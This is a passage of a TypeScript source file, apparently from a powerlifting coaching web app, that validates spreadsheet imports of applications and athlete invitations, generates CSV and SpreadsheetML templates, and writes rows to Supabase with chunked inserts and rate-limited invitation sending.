  const rows: LeadDraft[] = []
  const duplicateEmails: string[] = []

  table.rows.forEach((cells, i) => {
    const row = i + 2 // header is row 1
    if (isBlankRow(cells)) return

    const at = (column: string) => {
      const idx = map.get(column)
      if (idx === undefined) return ''
      return sanitizeText(cells[idx] ?? '', VALUE_MAX)
    }

    const first   = at('first_name')
    const last    = at('last_name')
    const service = at('service')
    const rawMail = at('email')
    const email   = sanitizeEmail(rawMail).toLowerCase()

    const gaps: string[] = []
    if (!first) gaps.push('a first name')
    if (!last) gaps.push('a last name')
    if (!email) gaps.push('an email address')
    if (!service) gaps.push('a service')
    if (gaps.length > 0) {
      issues.push({ row, message: `Row ${row} has no ${sentenceList(gaps)}, so it was left out.` })
      return
    }
    if (!isValidEmail(email)) {
      issues.push({ row, message: `Row ${row} has "${rawMail}" where an email address should be, so it was left out.` })
      return
    }
    if (seen.has(email)) {
      issues.push({ row, message: `Row ${row} repeats ${email}, which appears earlier in this file. Only the first one is kept.` })
      return
    }
    seen.add(email)

    const draft: LeadDraft = { first_name: first, last_name: last, email, service }
    for (const f of LEAD_FIELDS) {
      if (f.required) continue
      const value = at(f.column)
      if (value) draft[f.column] = value
    }
    // Last word, after the optional columns, so no spreadsheet can set it.
    draft.status = 'new'

    rows.push(draft)
    if (taken.has(email)) duplicateEmails.push(email)
  })

  return { rows, issues, duplicateEmails }
}

export interface InviteDraft {
  email: string
  first_name: string
  last_name: string
}

export interface PreparedInvites {
  rows: InviteDraft[]
  issues: RowIssue[]
  /** Addresses that already have an account or a live invitation. */
  alreadyIn: string[]
}

export function prepareInvites(table: ParsedTable, existingEmails: Set<string>): PreparedInvites {
  const issues: RowIssue[] = []
  const map = mapHeaders(table.headers, INVITE_INDEX, issues)

  if (!map.has('email')) {
    issues.push({ row: HEADER_ROW, message: missingColumnMessage([{ header: 'Email' }]) })
    return { rows: [], issues, alreadyIn: [] }
  }

  const taken = lower(existingEmails)
  const seen = new Set<string>()
  const rows: InviteDraft[] = []
  const alreadyIn: string[] = []

  table.rows.forEach((cells, i) => {
    const row = i + 2
    if (isBlankRow(cells)) return

    const at = (column: string) => {
      const idx = map.get(column)
      if (idx === undefined) return ''
      return sanitizeText(cells[idx] ?? '', 200)
    }

    const rawMail = at('email')
    const email = sanitizeEmail(rawMail).toLowerCase()
    if (!email) {
      issues.push({ row, message: `Row ${row} has no email address, so there is nobody to invite.` })
      return
    }
    if (!isValidEmail(email)) {
      issues.push({ row, message: `Row ${row} has "${rawMail}" where an email address should be, so it was left out.` })
      return
    }
    if (seen.has(email)) {
      issues.push({ row, message: `Row ${row} repeats ${email}, which appears earlier in this file. Only the first one is kept.` })
      return
    }
    seen.add(email)

    let first = at('first_name')
    let last = at('last_name')
    // A list of people usually has one Name column, not two. Split it rather
    // than sending an invitation addressed to nobody.
    const full = at('full_name')
    if (!first && full) {
      const parts = full.split(/\s+/)
      first = parts[0] ?? ''
      if (!last && parts.length > 1) last = parts.slice(1).join(' ')
    }

    rows.push({ email, first_name: first, last_name: last })
    if (taken.has(email)) alreadyIn.push(email)
  })

  return { rows, issues, alreadyIn }
}

// ═══════════════════════════════════════════════════════════════════════════
// Templates
// ═══════════════════════════════════════════════════════════════════════════

const LEAD_EXAMPLE: Record<string, string> = {
  first_name: 'Jordan', last_name: 'Reyes', email: 'jordan.reyes@example.com',
  service: '1:1 Coaching (Full Service)', coach_pref: 'No Preference', social: '@jordanlifts',
  age: '27', height: `5'9"`, body_weight: '181 lbs', weight_class: '83kg',
  experience: '2-4 years', injuries: 'None', train_days: 'Mon, Tue, Thu, Sat',
  occupation: 'Teacher', squat_max: '405 lbs', squat_freq: '3x/week', squat_style: 'Low Bar',
  bench_max: '265 lbs', bench_freq: '3x/week', bench_style: 'Medium Grip',
  dead_max: '475 lbs', dead_freq: '2x/week', dead_style: 'Conventional',
  current_program: 'Self-programmed, four days a week', weak_points: 'Bench lockout',
  learning_style: 'Visual (watching / reading)', sleep: '7 hrs', nutrition: '6',
  stress: '5', recovery: '7', expectations: 'Weekly feedback and a meet plan',
  goals: 'First meet in the spring',
}

const INVITE_EXAMPLE: Record<string, string> = {
  email: 'jordan.reyes@example.com', first_name: 'Jordan', last_name: 'Reyes',
}

function templateFields(kind: ImportKind) {
  return kind === 'leads'
    ? { fields: LEAD_FIELDS as Array<{ column: string; header: string }>, example: LEAD_EXAMPLE, sheet: 'Applications' }
    : { fields: INVITE_FIELDS as Array<{ column: string; header: string }>, example: INVITE_EXAMPLE, sheet: 'Invitations' }
}

/**
 * A template is a header row and one filled-in row.
 *
 * The example row is there to be overwritten, and it is one row rather than
 * zero because a blank grid does not tell anybody what "Service" is supposed to
 * contain. It goes through the same `csvCell` the exports use, so a template
 * downloaded and uploaded straight back parses to exactly what was written.
 */
export function templateCsv(kind: ImportKind): string {
  const { fields, example } = templateFields(kind)
  return toCsv(fields.map(f => f.header), [fields.map(f => example[f.column] ?? '')])
}

const xmlText = (v: string) =>
  v.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;')

const xmlCell = (v: string) => `    <Cell><Data ss:Type="String">${xmlText(v)}</Data></Cell>`

/**
 * The same template as an .xls.
 *
 * This is SpreadsheetML 2003, which is XML, not the old binary format. Excel,
 * Numbers and LibreOffice all open it by double click, and it costs no
 * dependency to write or to read back. Every cell is typed as String so a phone
 * number keeps its leading zero and a weight class does not become a date.
 */
export function templateSpreadsheetXml(kind: ImportKind): string {
  const { fields, example, sheet } = templateFields(kind)
  return [
    '<?xml version="1.0"?>',
    '<?mso-application progid="Excel.Sheet"?>',
    '<Workbook xmlns="urn:schemas-microsoft-com:office:spreadsheet"',
    '          xmlns:o="urn:schemas-microsoft-com:office:office"',
    '          xmlns:x="urn:schemas-microsoft-com:office:excel"',
    '          xmlns:ss="urn:schemas-microsoft-com:office:spreadsheet">',
    ' <Styles>',
    '  <Style ss:ID="Default" ss:Name="Normal"><Alignment ss:Vertical="Bottom"/></Style>',
    '  <Style ss:ID="head"><Font ss:Bold="1"/><Interior ss:Color="#E4E6F5" ss:Pattern="Solid"/></Style>',
    ' </Styles>',
    ` <Worksheet ss:Name="${xmlText(sheet)}">`,
    '  <Table>',
    '   <Row ss:StyleID="head">',
    ...fields.map(f => xmlCell(f.header)),
    '   </Row>',
    '   <Row>',
    ...fields.map(f => xmlCell(example[f.column] ?? '')),
    '   </Row>',
    '  </Table>',
    ' </Worksheet>',
    '</Workbook>',
    '',
  ].join('\n')
}

// ═══════════════════════════════════════════════════════════════════════════
// What already exists, for the duplicate check
// ═══════════════════════════════════════════════════════════════════════════

/** Every address already on an application. `null` is an outage, not "none". */
export async function fetchExistingLeadEmails(isDemo = false): Promise<Set<string> | null> {
  if (offline(isDemo)) return lower(new Set(DEMO_LEADS.map(l => l.email)))
  const { data, error } = await supabase.from('leads').select('email').limit(5000)
  if (error) return null
  const rows = (data ?? []) as Array<{ email?: string | null }>
  return lower(new Set(rows.map(r => String(r.email ?? ''))))
}

/**
 * Every address that already has an account or a live invitation.
 *
 * Both matter: the edge function refuses either one, and finding that out per
 * address after pressing send is a worse experience than being told up front.
 */
export async function fetchExistingPeopleEmails(isDemo = false): Promise<Set<string> | null> {
  const { fetchPeople } = await import('./userManagement')
  const { fetchInvitations, invitationState } = await import('./invitations')

  const people = await fetchPeople(isDemo)
  if (people === null) return null

  const set = new Set(people.map(p => (p.email ?? '').trim().toLowerCase()).filter(Boolean))

  // An invitations outage is survivable here: the worst case is a preview that
  // does not know about a pending invitation, and the edge function still
  // refuses it with a sentence when the send goes out.
  const invitations = await fetchInvitations()
  if (invitations) {
    for (const i of invitations) {
      if (invitationState(i) === 'pending') set.add(i.email.trim().toLowerCase())
    }
  }

  return set
}

// ═══════════════════════════════════════════════════════════════════════════
// Writes
// ═══════════════════════════════════════════════════════════════════════════

/** Rows per insert. Small enough to keep a refusal readable, big enough to be one round trip per hundred. */
const CHUNK = 100

/** A PostgREST error, in a sentence a person can act on. Mirrors settings.ts. */
function writeMessage(error: { message?: string; code?: string } | null, fallback: string): string {
  if (!error) return fallback
  const code = error.code ?? ''
  const msg = (error.message ?? '').replace(/^ERROR:\s*/i, '').trim()
  if (code === '42501' || /row-level security|permission denied/i.test(msg)) {
    return 'The database refused those rows. Only an admin can add applications. Sign out, sign back in, and try again.'
  }
  if (code === '23514') return 'Some of those values are outside what the table allows. Check the file and try again.'
  if (code === '23505') return 'Some of those rows already exist.'
  if (code === 'PGRST301' || /jwt|token is expired/i.test(msg)) {
    return 'Your session expired. Sign in again and run the import.'
  }
  if (/failed to fetch|networkerror|load failed/i.test(msg)) {
    return 'Could not reach the server. Check your connection and try again.'
  }
  return fallback
}

const plural = (n: number, one: string, many = `${one}s`) => `${n} ${n === 1 ? one : many}`

function partial(inserted: number, reason: string): string {
  return inserted === 0 ? reason : `${plural(inserted, 'application')} went in before this stopped it: ${reason}`
}

/**
 * Insert prepared applications.
 *
 * Admin-only on the server (the `leads_admin_all` policy), so this is not the
 * thing keeping anyone out. What it does do is `.select('id')` on every chunk,
 * because RLS does not refuse loudly: a policy the account fails returns success
 * with nothing inserted, and counting the rows that came back is the only way to
 * tell that apart from a real write.
 */
export async function importLeads(
  rows: LeadDraft[],
  isDemo = false,
): Promise<{ ok: true; inserted: number } | { ok: false; message: string }> {
  if (rows.length === 0) return { ok: false, message: 'There is nothing to import.' }

  if (offline(isDemo)) {
    await beat()
    return {
      ok: false,
      message: `This is the demo, so nothing was written. ${plural(rows.length, 'application')} would have been added.`,
    }
  }

  let inserted = 0
  for (let i = 0; i < rows.length; i += CHUNK) {
    const chunk = rows.slice(i, i + CHUNK)
    const { data, error } = await supabase.from('leads').insert(chunk).select('id')

    if (error) {
      return { ok: false, message: partial(inserted, writeMessage(error, 'The import stopped partway. Nothing further was added.')) }
    }
    const got = (data ?? []).length
    if (got === 0) {
      return {
        ok: false,
        message: partial(inserted, 'The database accepted the request and saved nothing, which is what a refused policy looks like from here. Your account may not be allowed to add applications.'),
      }
    }
    inserted += got
  }

  return { ok: true, inserted }
}

/** The mapped sentence for a rate limit, matched loosely because it may be reworded. */
const isRateLimit = (message: string) => /lot of invitations|rate limit|too many/i.test(message)

/**
 * Invite everybody in the file, one at a time.
 *
 * Sequential, not parallel, and it stops early on a rate limit. `invite-send`
 * allows twenty an hour per inviter and each call SENDS AN EMAIL, so firing
 * them off together would spend the allowance on failures and put a stack of
 * half-sent invitations behind them. Stopping and saying so leaves the rest of
 * the list intact to run again later.
 */
export async function sendBulkInvites(
  rows: InviteDraft[],
  isDemo = false,
): Promise<{ ok: true; sent: number; failed: Array<{ email: string; message: string }> } | { ok: false; message: string }> {
  if (rows.length === 0) return { ok: false, message: 'There is nobody to invite.' }

  if (offline(isDemo)) {
    await beat()
    return {
      ok: false,
      message: `This is the demo, so no email went anywhere. ${plural(rows.length, 'invitation')} would have been sent.`,
    }
  }

  const { sendInvitation } = await import('./invitations')

  let sent = 0
  const failed: Array<{ email: string; message: string }> = []

  for (let i = 0; i < rows.length; i++) {
    const person = rows[i]
    const res = await sendInvitation({
      email: person.email,
      role: 'athlete',
      firstName: person.first_name || undefined,
      lastName: person.last_name || undefined,
    })

    if (res.ok) { sent++; continue }
    failed.push({ email: person.email, message: res.message })

    if (isRateLimit(res.message)) {
      for (const rest of rows.slice(i + 1)) {
        failed.push({ email: rest.email, message: 'Not attempted. The hourly invitation limit was reached. Try the rest in an hour.' })
      }
      break
    }
  }

  return { ok: true, sent, failed }
}

/** What 012 defaults `expires_at` to. Here so the panel's copy cannot drift from it. */
export const INVITATION_DAYS = 14
